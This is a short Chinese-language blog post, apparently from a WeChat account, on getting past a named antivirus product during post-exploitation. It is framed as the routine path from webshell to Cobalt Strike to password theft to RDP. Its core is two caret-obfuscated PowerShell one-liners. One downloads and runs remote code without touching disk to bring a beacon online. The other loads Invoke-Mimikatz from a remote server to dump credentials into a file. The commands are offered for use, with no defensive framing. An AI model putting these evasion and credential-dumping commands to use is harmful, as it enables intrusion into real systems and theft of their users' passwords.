> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/UeWgNOUNP4fKAvKLzmCe1g)

视觉福利

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PZCtvaaOQSmLTz4LW7Ac7ibgFxKSLwo9QW2iaiaGalAj2qHaZHpDzDkFQWQIPFqXzwH8E1PCgQ9SU2RDq8WUAnsng/640?wx_fmt=jpeg)

### 前言

```
好多时候，拿到webshell以后。习惯性的想cs上线->读密码->3389一条龙服务cs上线，就牵扯到了关于powershell。读密码可以本地，也可以远程加载。为了方便，这里进行了powershell的免杀，绕过全家桶尝试。不光可以powershell->cs上线。mimikatz的远程加载更是方便的。
```

### 绕过某数字 powershell 无文件上线 cs  

```
借助powershell免杀，尝试cs上线，进而绕过全家桶查杀。
```

```
cmd /c echo I^E^X ((new-object net.webclient).d^o^w^n^l^o^a^d^s^t^r^i^n^g('http://127.0.0.1/a')) | p^o^w^e^r^s^h^e^l^l -|w^h^o^a^m^i
```

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/PZCtvaaOQSlLDS0DGibIQfFUewKk5Lhzx3dHmGNgvAW18k8FFytNLb3xgIibicxQP8XlHjqhicxbPsMDCfsTZqcNkA/640?wx_fmt=gif)

### 绕过某数字远程加载 mimikatz

```
采用Invoke-Mimikatz.ps1进行远程mimikatz远程加载的方式，进行绕过全家桶的查杀。
```

```
echo I^E^X (New-Object Net.W^e^b^C^l^i^e^n^t).D^o^w^n^l^o^a^d^S^t^r^i^n^g('http://10.0.100.14:80/download/Invoke-Mimikatz.ps1'); I^n^v^o^k^e^-M^i^m^i^k^a^t^z -D^u^m^p^C^r^e^d^s |p^o^w^e^r^s^h^e^l^l - >1234.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/PZCtvaaOQSlLDS0DGibIQfFUewKk5LhzxY70ZLCQC8Dia7rNgHyJbw53nqvjpbvcumTmdtjIFYAkne2ZB06tYibZA/640?wx_fmt=gif)

 **走过，路过。不要错过。点个关注再走呗。**

![](https://mmbiz.qpic.cn/mmbiz_jpg/PZCtvaaOQSkicC4NZic4cGC3dPs0gnNY0SmJtHgxdU7S47rGOhMibZslm4garusfvGCLYBbBreu21IdzGwYiaeElZg/640?wx_fmt=jpeg)

 **长按识别二维码，关注极梦 C 公众号哦~~**